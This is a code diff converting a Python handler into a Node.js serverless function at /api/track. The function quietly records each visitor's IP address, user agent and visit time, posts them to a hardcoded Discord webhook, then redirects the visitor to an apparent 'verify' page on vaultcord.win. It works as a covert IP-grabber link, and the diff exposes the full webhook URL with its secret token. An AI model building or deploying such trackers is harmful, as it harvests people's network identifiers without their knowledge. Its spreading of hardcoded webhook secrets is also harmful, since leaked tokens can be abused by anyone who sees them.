@@ -1,29 +1,35 @@
-import json
-import requests
-from datetime import datetime
+import fetch from "node-fetch"; // must import node-fetch
 
-def handler(request, response):
-    try:
-        # Grab visitor info
-        ip = request.headers.get("x-forwarded-for", request.client.host)
-        user_agent = request.headers.get("user-agent", "Unknown")
-        time = datetime.utcnow().isoformat()
+export default async function handler(req, res) {
+  try {
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
+    const userAgent = req.headers["user-agent"];
+    const time = new Date().toISOString();
 
-        # Build Discord message
-        message = {
-            "content": f"🟢 New visit:\n- IP: {ip}\n- User-Agent: {user_agent}\n- Time: {time}"
-        }
+    const message = {
+      content: `🟢 New visit:\n- IP: ${ip}\n- User-Agent: ${userAgent}\n- Time: ${time}`
+    };
 
-        # Send to Discord webhook (hardcoded)
-        webhook_url = "https://discord.com/api/webhooks/1412081122048741426/NWsChKO7PqLPxXKhjG0j6gyqzFQOv1Wvby8soi0UGKHkQjkF_6bMGvB3sn6iVsudusVg"
-        requests.post(webhook_url, data=json.dumps(message), headers={"Content-Type": "application/json"})
+    // Discord webhook URL — hardcoded for testing
+    const webhookUrl = "https://discord.com/api/webhooks/1412081122048741426/NWsChKO7PqLPxXKhjG0j6gyqzFQOv1Wvby8soi0UGKHkQjkF_6bMGvB3sn6iVsudusVg";
 
-        # Redirect visitor
-        response.status_code = 302
-        response.headers["Location"] = "https://vaultcord.win/silkwareverify"
-        return response
+    // await the fetch to ensure message sends
+    const response = await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(message)
+    });
 
-    except Exception as e:
-        print("Error in /api/track:", e)
-        response.status_code = 500
-        return "Internal Server Error"
+    if (!response.ok) {
+      console.error("Discord webhook failed:", await response.text());
+    }
+
+    // redirect visitor
+    res.writeHead(302, { Location: "https://vaultcord.win/silkwareverify" });
+    res.end();
+  } catch (err) {
+    console.error("Error in /api/track:", err);
+    res.status(500).send("Internal Server Error");
+  }
+}
